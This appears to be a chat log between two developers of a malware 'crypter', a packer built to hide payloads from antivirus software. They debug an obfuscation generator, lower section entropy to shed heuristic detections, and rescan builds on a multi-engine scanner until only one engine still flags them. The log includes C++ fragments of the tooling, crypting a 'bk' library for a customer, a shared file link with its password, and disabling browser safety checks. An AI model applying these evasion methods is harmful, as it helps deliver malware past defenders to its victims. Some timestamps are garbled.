[01.11.21 12:09:41] basil: i.e. do you run the obfuscator in 32 bit?
[01.11.21 12:09:47] basil: Not 64 bit
[01.11.21 12:10:08] elroy: noiser 64, what it generates is 32 bit app
[01.11.21 12:11:19] basil: I was generating code on a 64 bit obfuscator. And I was building the generated code on x32/x64 (release/debug)
[01.11.21 12:11:44] basil: I checked 4 options for building the obfuscated code
[01.11.21 12:11:50] basil: only one
[01.11.21 12:12:06] basil: I didn't use some tag in the test example
[01.11.21 12:12:11] basil: now look which one
[01.11.21 12:13:26] elroy: shufle
[01.11.21 12:13:33] basil: yes
[01.11.21 12:13:34] elroy: I don't think that's it.
[01.11.21 12:13:43] elroy: Although, of course, it could be.
[01.11.21 12:13:56] elroy: But then most likely just the file wouldn't collect
[01.11.21 12:14:02] elroy: It is collected, but falls out
[01.11.21 12:14:22] elroy: And that's weird. And without modifications, it doesn't fall out. I wish I knew where.
[01.11.21 12:14:53] basil: well, then it turns out that somewhere tags are put wrong. It looks like that. I think so. I can help in the search?
[01.11.21 12:16:18] elroy: Tags are set there correctly, the previous version would not work
[01.11.21 12:17:03] basil: ok. Everything can be. How can I help?
[01.11.21 12:17:36] basil: it might be the obuskator is malfunctioning somehow
[01.11.21 12:17:44] basil: nothing can be ruled out
[01.11.21 12:18:04] elroy: Right now I can't, because it helped me, now I will dig deeper, I hope to find the reason. But I still need a test from you under lvm, as they said on Friday
[01.11.21 12:18:45] elroy: And not for 3, but for 16 at least
[01.11.21 12:18:48] basil: clang I think I put
[01.11.21 12:19:01] basil: you installed 16
[01.11.21 12:19:14] elroy: okay, check with clang
[01.11.21 12:19:46] basil: Look, I didn't want to let you down at all. I tried to make that obfuscator as fast as possible. But it works for me.
[01.11.21 12:20:00] basil: At least with the code I sent
[01.11.21 12:20:24] elroy: Okay, so far I can't say I failed, since it works.
[01.11.21 12:20:25] basil: I didn't mean to
[01.11.21 12:21:09] elroy: When I find that it's in obfuscator, I'll tell you)))
[01.11.21 12:21:14] elroy: (just kidding)
[01.11.21 12:21:31] basil: ok. ok.
[01.11.21 12:37:39] basil: LLVM works too
[01.11.21 12:39:01] elroy: That's good
[01.11.21 12:39:01] elroy: Thank you)
[01.11.21 12:39:22] basil: ok
[01.11.21 15:04:30] basil: test
[01.11.21 15:05:04] basil: there spam bot customer is away again. So if I can help - write.
[01.11.21 15:20:16] elroy: you can
[01.11.21 15:20:42] basil: write
[01.11.21 15:21:57] elroy: Put the finalized generator into crypter in a separate branch, made that commit I'll write now. Integrate and test what happens with the detects
[01.11.21 15:22:26] elroy: Including performance test
[01.11.21 15:22:50] basil: ok
[01.11.21 15:27:00] basil: write about the commit. which one
[01.11.21 15:28:12] elroy: commit
```
SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
id 205c06ae872395271eac66f305058c380036604b
from 2021-09-09 14:55:20
```
[01.11.21 15:28:33] elroy: This is a commit in the develop branch
[01.11.21 15:28:42] basil: got it
[01.11.21 15:29:44] elroy: Then you paste your new branch locally in some branch, for example in develop_payload_generic and grift it. I wonder if the detects will go away
[01.11.21 15:30:04] basil: ok. ok.
[03.11.21 14:04:36] elroy: turn off e2e
[03.11.21 14:04:56] elroy: And turn off e2e
[03.11.21 14:04:57] basil: test
[03.11.21 14:05:01] elroy: test okay
[03.11.21 14:05:04] basil: yes. ok.
[03.11.21 14:05:15] basil: I'll send you the utility
[03.11.21 14:07:39] basil: q4cp$hCleiY69BK$I1dOHYrAWMR2KdGjGwbEydXw
[03.11.21 14:09:16] basil: https://file.io/ov0zoSZou6yy
[03.11.21 14:09:54] elroy: Thank you.
Listen, can you explain this thought, please?
```
[13:58:23] <faster> you can also add code from current utility code into Wrapper.
[13:58:40] <faster> okay.
```
The utility consists just of wrapper code... And what is ObfuscateCode() ? I hope it's not a utility call ?
[03.11.21 14:11:55] basil: a moment
[03.11.21 14:13:01] basil: I'll extract the branch now.
[03.11.21 14:15:31] basil: ``
bool PeReader::ObfuscateCode()
{
	const size_t count = m_stub->CountFilesToObfuscate;
	 _StubFilesToObfuscate* pFiles = (_StubFilesToObfuscate*) m_stub->FilesToObfuscate;
	
	TCHAR curPath[MAX_PATH];
	GetCurrentDirectory(sizeof(curPath), curPath);
	string curPathStr = curPath;
	curPathStr += "\\";



#ifdef _DEBUG
	curPathStr = curPathStr.substr(0, curPathStr.size()-1);
	string del = "SolutionBuilderProj";
	string::size_type pos = curPathStr.find(del);
	curPathStr.erase(pos, del.size());

#endif

	
	
	for (size_t c = 0; c < count; c++)
	{

		std::string commLine = curPathStr + "\\noiser.exe";
		commLine = commLine + " --src_cpp_file " + curPathStr + pFiles->SrcCppFile;
		commLine = commLine + " --dst_cpp_file " + curPathStr + pFiles->DstCppFile;

		commLine = commLine + " --src_h_noise_tpl " + curPathStr + pFiles->TplSrcNoiseHFile;
		commLine = commLine + " --src_cpp_noise_tpl " + curPathStr + pFiles->TplSrcNoiseCppFile;

		commLine = commLine + " --dst_h_noise_file " + curPathStr + pFiles->TplDstNoiseHFile;
		commLine = commLine + " --dst_cpp_noise_file " + curPathStr + pFiles->TplDstNoiseCppFile;

		commLine = commLine
			+ " --code-complexity "
			+ to_string(m_code_complexity.maxLocVar) + ","
			+ to_string(m_code_complexity.maxOper) + ","
			+ to_string(m_code_complexity.maxGenFunc) + ","
			+ to_string(m_code_complexity.maxDeep) + ","
			+ to_string(m_code_complexity.maxMainFuncOper)+","
			+ to_string(m_code_complexity.deepWrappe);


		if (system(commLine.c_str())) {
			printf("noiser.exe can not obfuscation code.\n");
			return false;
		}

		pFiles++;
	}

	return true;
}
```
[03.11.21 14:15:44] basil: There is such a variant
[03.11.21 14:16:02] basil: That is exactly calling the utility from the command line
[03.11.21 14:17:56] basil: There's a variant when the utility code is embedded exactly into Wrapper class. That is, I took the code from the utility and put it into Wrapper, ReadyCodeObfuscator and other classes where I needed it
[03.11.21 14:18:08] basil: Which variant to leave
[03.11.21 14:18:09] basil: ?
[03.11.21 14:20:48] elroy: No offense, I'm not out of spite.)
But how could you come up with such a thing! )))
All code is embedded in Wrapper and other classes. Compare files (notepad++ and compare plugin) yes perensi.
Just utility consists almost entirely of code Wrapper, ReadyCodeObfuscator, etc. I just copied them from the Solutionbuilder.
[03.11.21 14:22:00] elroy: I'll remember this function)))
[03.11.21 14:24:02] basil: okay. I just didn't get it. Yesterday, I think that was the first option you told me to do. It seemed strange to me, too. But I didn't want to argue. And I originally built the code into Wrapper. It's in a separate thread. I saved it just in case. I just didn't argue.
[03.11.21 14:24:28] basil: I'll throw it in now. Another branch.
[03.11.21 14:26:33] elroy: Good)))
[03.11.21 14:39:21] elroy: And what was the fix?
[03.11.21 14:39:39] basil: hold on now
[03.11.21 14:39:45] basil: 3 min
[03.11.21 14:42:07] basil: something's wrong....
[03.11.21 14:42:14] basil: I'm having
[03.11.21 14:42:20] basil: I'm sorry.
[03.11.21 14:42:33] elroy: okay.
[03 11/21/221 14:42:44] basil: let me just sit here a little longer I don't understand. What's going on.
[03.11.21 14:42:55] elroy: okay.
[03.11.21 15:03:08] basil: Oh... Look, I meant well.
[03.11.21 15:03:17] basil: But there's a strange thing going on here.
[03.11.21 15:03:39] basil: There are two branches
[03.11.21 15:03:50] basil: develop_obfuscation_with_noiser.exe
develop_obfuscation_with_utility
[03.11.21 15:05:47] basil: in the first one there's a "weird" use of the utility. In the second one, I moved the Wrapper code into the cryptor. A dyncheck gives a clean result for develop_obfuscation_with_noiser.exe and a dirty one for develop_obfuscation_with_utility
[03.11.21 15:05:56] basil: What kind of nonsense is this?
[03.11.21 15:06:54] basil: Can we somehow make 2 Wrappers?
[03.11.21 15:07:01] basil: I'm really confused
[03.11.21 15:07:31] basil: Or use this "weird" variant for now?
[03.11.21 15:07:58] basil: I can't understand anything
[03.11.21 15:08:11] elroy: Try to experiment with random number generator, smells very much like non-random generation.
[03.11.21 15:08:24] elroy: If you call the utility, the code will be different by idea
[03.11.21 15:08:39] elroy: That is, there will be other values of random generator
[03.11.21 15:08:56] elroy: But in general it's interesting. I'll have a look a bit later myself.
[11.03.21 15:08:57] basil: By the way.
[03.11.21 15:12:41] elroy: May be some common code structure pattern detects. In one case the code is wrapped in two ways, what you were asking about from the beginning of the conversation (wrapping the noise export into a dll). In the other case everything is as per template
[03.11.21 15:13:39] elroy: And as another option, you can see one code, in studio, and build another. That's how studio and git sometimes mess around.
[03.11.21 15:14:05] basil: they have interesting jokes
[03 11/21/221 15:14:23] basil: Okay. I'll be back in 10 minutes. to the shop
[03.11.21 15:15:07] elroy: Okay.
[03.11.21 15:38:47] basil: in place
[03.11.21 15:38:55] basil: that's while I was walking.
[03.11.21 15:39:05] basil: I was thinking about the second option
[03 11.21 15:40:23] basil: I propose now to make me some kind of switch. Which will switch patterns. Let's see if it works.
[03.11.21 15:41:10] elroy: Ok, add option --use-external-obfuscator yes to build-system options
[04.11.21 08:25:38] basil: Test
[04.11.21 08:25:45] elroy: test ok
[04.11.21 08:25:52] basil: That's good
[04.11.21 08:27:19] elroy: About yesterday's problem. Look at how parameters are added in buildsystem, here's that parameter --use-external-obfuscator, you need to get the path to obfuscator from it not yes.
[04.11.21 08:27:29] elroy: But we have paths without spaces
[04.11.21 08:27:42] elroy: Not supported with spaces
[04.11.21 08:30:40] basil: I'm trying to make it normal. If detects still will remain - then I introduce this parameter "--use-external-obfuscator".
[04.11.21 08:31:47] elroy: Have you checked situation many times?
[04.11.21 08:31:53] elroy: Maybe by accident?
[04.11.21 08:33:18] basil: Well I can check again now of course. There's even a very different size of about 530kb vs 900kb. Binary works - checked
[04.11.21 08:34:22] elroy: Check the size of the binary again
[04.11.21 08:34:44] basil: On the other hand, if I hadn't done that, you wouldn't have known you could fight detects that way
[04.11.21 08:35:06] basil: Bad luck helped
[04.11.21 08:35:23] elroy: There the question is that the wrong thing most likely turns out. Or it turns out twice.
[04.11.21 08:35:46] elroy: And detects can be overcome by changing parameters
[04.11.21 08:35:58] basil: Yes?
[04.11.21 08:35:59] elroy: It helps not always, but it helps
[04.11.21 08:36:06] elroy: That's why we use this method
[04.11.21 08:36:24] basil: Okay, I'll run it a few more times
[04.11.21 08:48:37] basil: https://dyncheck.com/scan/id/cc5e25fc98d1a5bb3af74b6179a5900c
[04.11.21 08:49:10] basil: https://dyncheck.com/scan/id/cd5bef65e9c7ad0730cf857af6cb16db
[04.11.21 08:49:45] basil: with utility about 980kb, without utility 570kb
[04.11.21 08:51:10] elroy: The same for both cases ?
[04.11.21 08:51:35] elroy: file is not wrapped twice, by utility and internally
[04.11.21 08:53:41] basil: No. So, only UniCrypter.cpp is wrapped by utility and payload.cpp by Wrapper class
[04.11.21 08:56:53] basil: I'm thinking. I have an opinion that there are different templates in the code with and without embedded conditions
[04.11.21 08:59:48] elroy: The size is very different
[04.11.21 09:00:24] basil: do you think there were multiple wrapping?
[04.11.21 09:01:53] elroy: I don't know, but it's a sign of either a large complexity or there was a double pass. What else could cause that kind of growth?
[04.11.21 09:02:55] basil: yes it makes sense
[04.11.21 09:03:32] basil: ok. i'll try to check it with a diff
[04.11.21 09:05:04] elroy: There was a situation we turned a blind eye to before, back in the initial versions of the crypter.
We were generating files with \n and \r\n endings mixed in one file. So, when I changed it to one of them (\r\n), the detection changed. It's more like a compiler bug or something
[04.11.21 09:05:57] basil: I'm getting hairy now))))
[04.11.21 09:06:12] basil: That's not so subtle.....
[04.11.21 09:08:37] elroy: There were also similar ones depending on presence of comments in file.
There were #define blocks commented out. So, if the block was commented out it had a detection, if it wasn't there at all it had no detection. In essence, an unmentioned #define is the same as if it didn't exist. But somewhere in the compiler something was affected
[04.11.21 09:09:21] elroy: You can also try experiment with 2022 studio, it could correct bug (and add new ones).
[04.11.21 09:09:29] elroy: There's a branch with 2022 there, if you remember
[04.11.21 09:09:38] elroy: We should properly mix (merge) these branches
[04.11.21 09:09:52] elroy: LOCALLY
[04.11.21 09:10:44] basil: ok. i'll try now
[04.11.21 09:15:16] elroy: Check also entropy of both files, you can do it from console, just build --check-entropy yes --payload c:\...
Something like this
[04.11.21 09:15:35] basil: entropy is about the same there
[04.11.21 09:15:44] basil: looked in console
[04.11.21 09:15:57] elroy: there's just a Heur.AdvML.B detection file, it occurs at high entropy
[04.11.21 09:16:11] elroy: Usually 7+
[04.11.21 09:18:39] basil: average
text 6.7
rdata 6.7
[04.11.21 09:19:05] basil: but data is different
[04.11.21 09:19:41] basil: without utility 2.7 with utility 3.1
[04.11.21 09:20:12] basil: maybe forcibly install it
[04.11.21 09:20:17] elroy: Well, bring down detector to 2.7 artificially, will it work?
[04.11.21 09:20:22] elroy: Yep.)
[04.11.21 09:20:29] basil: Okay.
[04.11.21 09:20:32] basil: now
[04.11.21 09:33:02] basil: is it also set --entropy-data 3 ?
[04.11.21 09:33:24] elroy: 3.0
[04.11.21 09:34:17] basil: info: failed to replace export self name
Is it supposed to be like that?
[04.11.21 09:34:40] elroy: That's info
[04.11.21 09:34:44] elroy: That's okay
[04.11.21 09:34:50] elroy: And in both cases it is?
[04.11.21 09:35:21] basil: don't get it. rephrase
[04.11.21 09:35:50] elroy: This information is shown for builds with and without external utility ?
[04.11.21 09:36:19] basil: it shows up when I try to force entropy
[04.11.21 09:36:30] elroy: It's for dll builds to patch library name to garbage, not to show the word crypter (project name) in the work
[04.11.21 09:36:43] elroy: And in other case it is not shown?
[04.11.21 09:36:49] basil: no
[04.11.21 09:36:54] basil: that didn't happen
[04.11.21 09:37:21] basil: but somehow entropy doesn't change
[04.11.21 09:37:32] elroy: Well, this is interesting. On output dll ?
[04.11.21 09:38:15] basil: no. exe - you can run it
[04.11.21 09:39:32] elroy: It's really interesting. Look by code, there this message is shown when file is opened for patch and UniCrypter.dll word cannot be found and replaced in it.
[04.11.21 09:39:48] elroy: Why it is not shown in the first case is no less interesting
[04.11.21 09:39:55] basil: ok
[04.11.21 09:39:58] elroy: because in the first case it succeeds
[04.11.21 09:40:04] elroy: Probably.
[04.11.21 10:25:06] basil: question
[04.11.21 10:25:09] basil: std::string DllExp = (m_stub->ProjectName + 1) + std::string(".dll")
[04.11.21 10:25:45] basil: this
```
(m_stub->ProjectName + 1)
```
[04.11.21 10:26:01] basil: correct?
[04.11.21 10:26:07] elroy: yes
[04.11.21 10:26:19] elroy: That's the second character
[04.11.21 10:27:03] basil: niCrypter.dll
[04.11.21 10:27:13] basil: not UniCrypter.dll
[04.11.21 10:27:25] elroy: Yes.
[04.11.21 10:29:11] elroy: There's a subtlety to the search. The search function isn't looking for a page from the beginning, and this construction is used to satisfy that function. The UniCrypter.dll line will be deleted.
This is from memory. You have to look through the code more precisely. But this code was correct...
[04.11.21 10:29:54] basil: ok
[04.11.21 10:33:22] basil: Okay. I think everything will work out. I'll DESTROY those detectors anyway.
[04.11.21 10:33:45] elroy: ok))
[04.11.21 10:34:31] elroy: I wrote a generator of new conditions for conditional transitions
[04.11.21 10:34:42] elroy: I'm looking at where to build in...
[04.11.21 10:39:29] basil: That's good news)))
[04.11.21 10:42:45] basil: Couldn't answer right away, deep in debugging
[04.11.21 10:54:02] basil: no. entropy has no effect on detection.
[04.11.21 10:54:04] basil: something else
[04.11.21 11:10:51] elroy: I am concerned about size
[04.11.21 11:11:22] basil: from what position? just the size is big?
[04.11.21 11:11:38] elroy: Well, it's not just big.
[04.11.21 11:11:55] basil: very big?
[04.11.21 11:11:58] basil: too big?
[04.11.21 11:12:13] elroy: I mean the differences.
[04.11.21 11:12:45] elroy: With the same complexity it shouldn't differ that much
[04.11.21 11:13:19] elroy: There are 3 complexity parameters in crypto, did you check right, i.e. the right one?
[04.11.21 11:13:42] elroy: stub-complexity code-complexity pack-complexity
[04.11.21 11:13:55] basil: in config.h yes. They are the same there.
[04.11.21 11:16:02] elroy: Well set --code-complexity parameters from the command line
[04.11.21 11:16:16] elroy: To build with external and with internal
[04.11.21 11:16:18] elroy: The same
[04.11.21 11:17:04] basil: ok. let's try that too
[04.11.21 11:32:45] basil: no --code-complexity gave me nothing new
[04.11.21 11:37:48] basil: okay. 40 min break. Maybe something else will come to mind.
[04.11.21 11:39:16] basil: well. See
https://dyncheck.com/scan/id/3c3e2b955221e56c4b05672fcc6b12c0
[04.11.21 11:39:29] basil: but I only commented out nopWinApiFunc
[04.11.21 11:39:45] basil: ``
char* nopWinApiFunc[] =
{
	""
}
```
[04.11.21 11:40:12] basil: and HEUR detection
[04.11.21 11:40:25] basil: only . This must be entropy
[04.11.21 11:45:21] elroy: Nah, also zudochka
[04.11.21 11:45:58] basil: but HEUR is most likely entropy
[04.11.21 11:46:00] elroy: By the way, yes, there are differences in this place, you have no functions in noiser, and in crypto you have them
[04.11.21 11:46:11] elroy: Yes, it's entropy usually
[04.11.21 11:46:17] elroy: High
[04.11.21 11:46:32] elroy: You can drop it down to 5.7 in rdata
[04.11.21 11:46:43] basil: yes. already ran
[04.11.21 11:47:39] elroy: > okay. 40 min break.
Go and really clear your mind)).
[04.11.21 11:48:22] elroy: Like there: "Make a deep entrance..."
[04.11.21 11:48:27] basil: https://dyncheck.com/scan/id/8145d0f3e03b5b49318aab7cdd828aeb
[04.11.21 11:48:30] basil: there !
[04.11.21 11:48:33] basil: better
[04.11.21 11:48:39] basil: reset entropy
[04.11.21 11:48:47] basil: --entropy-max-rdata 5.7
[04.11.21 11:49:15] elroy: There's nano where it came from. He's no better, either.
[04.11.21 11:49:16] basil: Is NANO in vogue now? I mean, you can ignore it.
[04.11.21 11:49:31] elroy: Nothing can be ignored
[04.11.21 11:49:34] elroy: That's my understanding
[04.11.21 11:49:40] basil: Okay.
[11.11.21 12:34:03] basil: there is only NANO left. I'll try to clean it manually. Maybe it will give me something.
[04.11.21 12:34:16] basil: more or less will work
[04.11.21 14:15:13] basil: test
[04.11.21 14:15:33] elroy: Can you make library profile bk here using external obfuscator?
[04.11.21 14:16:23] basil: I don't get it. How?
[04.11.21 14:16:36] elroy: Well, you need to crypt the dll
[04.11.21 14:16:47] elroy: But clean
[04.11.21 14:16:53] elroy: With this external obfuscator
[04.11.21 14:17:43] basil: maybe put this branch locally. into a branch with bk and crypt
[04.11.21 14:17:48] basil: which file?
[04.11.21 14:19:02] elroy: Write nick he will give you. You need a clean crypt. And it needs a line in the file. To get the string, open the prepared file in IDA and there strings, copy the longest string from there
[04.11.21 14:19:30] elroy: Don't forget about --gen-exports parameter
[04.11.21 14:19:58] basil: okay. now.
[04.11.21 14:27:26] basil: test
[04.11.21 14:27:36] basil: you know what is "1 crypt with random string"
[04.11.21 14:31:01] elroy: Yes, I do)
[04.11.21 14:31:05] elroy: I wrote above)
[04.11.21 14:31:21] elroy: He needs a random string inside the final crypt
[04.11.21 14:31:41] elroy: Check IDA file, lines, copy from there
[04.11.21 14:31:54] basil: got it. ok.
[04.11.21 14:39:19] basil: 5 mb
[04.11.21 14:40:06] elroy: wow.
[04.11.21 14:40:34] elroy: That's weird.
[04.11.21 14:40:43] basil: now it still needs to be checked
[04.11.21 14:40:44] elroy: is it really about the obfuscator?
[04.11.21 14:40:48] basil: maybe dirty
[04.11.21 14:42:13] basil: but clean
[04.11.21 14:42:15] basil: https://dyncheck.com/scan/id/54d31f74c70cb2d91bd4d5c6f7e3faf7
[04.11.21 14:42:30] elroy: 5 mb is a lot) limit 1
[04.11.21 14:42:33] elroy: I wish I understood why.
[04.11.21 14:42:48] elroy: And this is not a branch from the top ?
[04.11.21 14:43:37] basil: no. I just pasted this utility branch into the beta_bk branch
[04.11.21 14:43:54] basil: locally, of course
[04.11.21 14:46:19] elroy: And the branch with the utility grows from the develop branch
[04.11.21 14:46:24] elroy: That's your answer
[04.11.21 14:46:29] elroy: *answers
[04.11.21 14:46:55] basil: yes.
[04.11.21 14:47:35] elroy: so true, figured out what's for)
[04.11.21 14:48:12] elroy: figured out yourself why the detects and size are different?
[04.11.21 14:50:02] basil: I don't get it at all. I've gone over the code today. But I still don't understand it. Now I've got it up to detected only under NANO AV. I am trying to fix it. So far I'm fighting only with him.
[04.11.21 14:52:10] elroy: I wrote above. I'll explain.
This is just the variant, at the top, where you prepared everything for the CRT ejection, and rewrote the data representation. And the dimensions became gigantic. That's why I last wrote a commit to do something with.
You now have two branches, one from that commit and one from the top. Because the data is in a different form, there are no detects. The size is bigger, because of the different representation of the data.
[04.11.21 14:52:14] elroy: Here are all the answers
[04.11.21 14:53:31] elroy: Download program Guitar, open in folder with git, it will show you state of graphical branches, you'll understand...
[04.11.21 14:54:07] basil: did i take it from the top?
[04.11.21 14:54:24] elroy: guitar says yes
[04.11.21 14:54:42] elroy: and 5 mb file says so too)
[04.11.21 14:56:01] basil: good. at least now I'll know
[04.11.21 15:00:25] basil: test
[04.11.21 15:01:16] basil: thank you. of course and definitely. but i've had a stupid day today - i've been tossing and turning.
[05.11.21 12:30:42] basil: hello
[05.11.21 12:30:51] basil: That's good
[05.11.21 12:31:16] elroy: Keep going.)
[05.11.21 12:32:07] basil: what happened?
[05.11.21 12:32:32] basil: what do you mean "something happened?"
[05.11.21 12:32:57] elroy: "That's good." - something wanted as well?
[05.11.21 12:36:10] basil: Yes. no. I'm still in the process. If you're interested in the latest news - made nick this crypt yesterday. At first it kind of didn't work. Then it worked, again, sort of. But of course they complained about the size of the crypt.  Now I'm trying to convert data storage in text section from char[] to unsigned long long []. But at the moment codogeneration is working just a few times
[05.11.21 12:40:40] basil: And "that's good" - it's good that encryption is enabled
[05.11.21 12:46:01] elroy: That's what I wanted to talk about
[05.11.21 12:46:24] basil: Go ahead. )))
[05.11.21 12:46:45] elroy: Represent presents 4 generation classes, per 1 2 4 8 bytes.
[05.11.21 12:47:08] elroy: There's only one difficulty there, it's to correct template
[05.11.21 12:47:18] elroy: There you corrected the template and made CharArray
[05.11.21 12:47:32] elroy: Here's almost exactly the same way to fix 3 more
[05.11.21 12:47:38] elroy: Or rather, make on their basis
[05.11.21 12:48:16] basil: Well, that's what I'm trying to do
[05.11.21 12:50:15] elroy: Is there any difficulty? With bytes there everything is clear, suggest something?
[05.11.21 12:51:02] basil: now a moment
[05.11.21 12:51:13] elroy: I'm sure you'll figure it out yourself sooner or later, but if you're stuck, just ask, it'll be faster.)
[05.11.21 12:52:17] basil: Yeah. no. it's okay. There's nothing particularly complicated there. The principle of the device is clear))). There's just some bother, though.
[05.11.21 12:53:06] basil: There's a little mistake here - there's some kind of complexity. It's essentially fluid, but not very pleasant.
[05.11.21 12:53:23] basil: I'll do it all right. I don't have any fundamental questions.
[05.11.21 12:53:44] elroy: Okay.
[05.11.21 13:21:21] elroy: Everything should be easy to replace there. The data types there are formed.
```
uiunt64* arr = f_alloc(...);
uind64 data;
...
arr[i] = data;
return (char*)arr;
[05.11.21 13:30:27] basil: well, not at all
[05.11.21 13:30:35] basil: not really
[05.11.21 13:31:46] elroy: And what are the differences there? (peculiarity)
[11.05.21 13:34:58] basil: well, it turns out that in Represent you pass any size of data, and the final buffer must be equalized by a multiple of the size of the data storage type. Plus, as I understand that for example in the lon long byte order litle endian, and should be byte order primitive. In principle, the latter problem can be solved by using digit=_byteswap_uint64(digit);
[05.11.21 13:35:07] basil: well, it's not hard, it's more disgusting
[05.11.21 13:35:54] elroy: That problem was already solved there
[05.11.21 13:36:04] elroy: b1 b2 etc. is collected there.
[05.11.21 13:36:42] basil: yes. noticed now
[05.11.21 13:36:43] elroy: Look closely. There you just change the vector to an array and that's it))
[05.11.21 13:48:53] basil: solved yes. But there stf::
[05.11.21 13:48:56] basil: std::
[05.11.21 14:03:02] elroy: Where exactly is std there ?
[05.11.21 14:03:21] elroy: In the generator itself - whatever, but in the code there changes without std
[05.11.21 14:04:06] basil: Here
[05.11.21 14:04:13] basil: ``
ReprFunc_VectorUInt::ReprFunc_VectorUInt(PeReader* pPeReader) :
	Represent::Represent(pPeReader)
{
	static const char* header =
		"char* %s(size_t* size) {\r\n"
		" unsigned int data;"
		" std::vector<char> ret;"
		" std::vector<unsigned int> vect;"
		" vect.reserve(1024*1024*4);"
		" %s \r\n"
		" try {\r\n";
	static const char* data[] = {
		" data = 0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx; vect.push_back(data); \r\n"
	};
	static const char* footer =
		" } catch(const std::bad_array_new_length &e) { std::cout << %s << e.what(); } \r\n"
		"  *size=%d; \r\n"
		" ret.resize(vect.size() * sizeof(unsigned int)); \r\n"
		" f_memcpy(ret.data(), vect.data(), ret.size()); \r\n"
		" return (char*)ret.data(); }\r\n"

	TplHeader = header;
	TplFooter = footer;
	TplDataArr = data;
	TplDataCount = sizeof(data) / sizeof(char*);
}
```
[05.11.21 14:04:23] basil: ```
 data = 0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx; vect.push_back(data); \r\n"
```
[05.11.21 14:06:01] elroy: ```
0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx;
```
Is it std ?
[05.11.21 14:06:05] basil: or am I trying to make something up again
[05.11.21 14:06:17] basil: sorry
[05.11.21 14:06:21] basil: stl
[05.11.21 14:06:49] elroy: there will be data = 0x00112233...
[05.11.21 14:07:01] elroy: i.e. the percent stays in the generator
[05.11.21 14:07:12] elroy: In the build it will be data = <value>
[05.11.21 14:07:44] elroy: push_back
it is typical
arr[i++] = data
[05.11.21 14:07:57] basil: yes. exactly.
[05.11.21 14:08:19] basil: i don't know. lately i've been thinking in the wrong direction
[05.11.21 14:08:50] elroy: think that way.)
[05.11.21 14:10:52] basil: okay now. I'll pull myself together. I'll be a man.
[05.11.21 15:08:27] basil: test
[05.11.21 15:08:41] basil: Well, here we go.
[05.11.21 15:09:28] basil: now we have to mix the data
[05.11.21 15:10:49] elroy: If you only sent 3 messages, okay.
[05.11.21 15:11:01] elroy: Otherwise there were reconnects
[05.11.21 15:11:18] basil: Yeah, he sent 3
[08.11.21 11:13:18] basil: hello
[08.11.21 11:14:55] elroy: Hello
[08.11.21 11:15:03] elroy: Let's use
[08.11.21 11:15:07] elroy: Less history will be lost
[08.11.21 11:15:21] basil: Okay. As you wish.
[08.11.21 11:16:00] basil: I made crypto on weekend. With new form of data storage (in arrays, not vector)
[08.11.21 11:16:08] basil: Clean
[08.11.21 11:16:10] basil: https://dyncheck.com/scan/id/3b518a7829e363810685a3f13d1b0d68
[08.11.21 11:16:21] basil: But it can differ from build to build
[08.11.21 11:16:36] elroy: Wonderful.) I'll take a look. What branch?
[08.11.21 11:16:45] basil: But size.....
[08.11.21 11:17:39] basil: Even when using unsigned __int64. At load size of 11 kb it sprawls to 380 kb
[08.11.21 11:17:58] basil: develop_obfuscation_with_utility branch
[08.11.21 11:18:09] elroy: why didn't the vector grow?)
[08.11.21 11:18:29] elroy: It turns out that there, the code was building at the build stage?))
[08.11.21 11:18:44] basil: I think it's because you have to use a cell index in arrays every time
[08.11.21 11:19:28] basil: but for a vector. there's the same method vector.push_back(data)
[08.11.21 11:19:57] elroy: Make then
int i = 5;
arr[i++] = ...
[08.11.21 11:20:17] basil: yes. you can. Let me try
[08.11.21 11:20:38] elroy: More
[08.11.21 11:20:58] elroy: ``
#include <Windows.h>
#include <intrin.h>
#include <iostream>
#include <string>

int main()
{
	int a[4];
	__cpuid(a, 1);
	bool support_native_random = a[2] & 0x40000000;

	unsigned int hardRand;
	if (support_native_random)
	{
		if (_rdrand32_step(&hardRand))
			MessageBoxA(0, std::to_string(hardRand).c_str(), " : hardware random", MB_OK);
		else
			MessageBoxA(0, "false :(", " : not supported", MB_OK);
	}
	else
		MessageBoxA(0, "hardware random is not supported", " : not supported", MB_OK);

    //std::cout << "Hello World!\n";
	return 0;
}
```
[08.11.21 11:21:15] elroy: Build this walkthrough, run it on different machines.
[08.11.21 11:21:19] elroy: I wonder what it will say
[08.11.21 11:21:28] elroy: Found bug in crypto...
[08.11.21:21:44] basil: ok. Does it have to be done right now? Or will it hold?
[08.11.21 11:22:15] elroy: It's really urgent)
[08.11.21 11:22:18] elroy: I wonder how it is on VM and on bare hardware
[08.11.21 11:23:13] basil: ok.
[08.11.21 11:23:56] basil: does the bit rate matter?
[08.11.21 11:24:06] elroy: yes
[08.11.21 11:24:13] elroy: 32 and 64
[08.11.21 11:24:28] basil: Okay.
[08.11.21 11:25:40] basil: in win7 x32 1759500975
[08.11.21 11:26:02] basil: in win7 x64 3416828987
[08.11.21 11:26:38] elroy: If everything works, there should be a messagebox with a number. If it crashes or doesn't work, or other messages, then I wonder. Otherwise, just check for "works or not", i.e. whether it shows a number or not.
[08.11.21 11:26:48] elroy: The results are interesting if the number is not showing
[08.11.21 11:27:28] basil: on 64 bit hardware it works
[08.11.21 11:27:28] basil: the number is showing
[08.11.21 11:27:37] basil: 32 bit defender ate
[08.11.21 11:27:59] basil: gonna turn it off
[08.11.21 11:28:15] basil: the question will . Don't go too far away.
[08.11.21 11:28:17] elroy: Oh, what a pest catch....
[08.11.21 11:29:31] basil: 32 bit on iron. Also correct.
[08.11.21 11:29:40] basil: shows
[08.11.21 11:29:57] basil: on other win versions in virtual machine check?
[08.11.21 11:30:48] elroy: Nah, it depends on CPU
[08.11.21 11:30:56] elroy: On any OS
[08.11.21 11:31:05] basil: ok
[08.11.21 11:31:57] basil: I was trying to disable safe browsing in tor browser
[08.11.21 11:32:15] basil: But I can't find it in the settings
[08.11.21 11:32:29] basil: can you tell me where it is?
[08.11.21 11:32:45] elroy: I will
[08.11.21 11:32:53] elroy: Type about:config
[08.11.21 11:33:10] elroy: Then there is a search line, type safebrows
[08.11.21 11:33:19] elroy: The telemetry is turned off there too
[08.11.21 11:34:32] basil: there's a lot that starts with safebrows. Or do all in a row false
[08.11.21 11:34:36] basil: ?
[08.11.21 11:35:01] elroy: Yes.
[08.11.21 11:35:18] basil: jr.
[08.11.21 11:35:19] basil: ok
[08.11.21 11:37:28] basil: I'll go back in now.
[08.11.21 11:38:45] basil: test
[08.11.21 11:38:57] basil: ok. OTP works
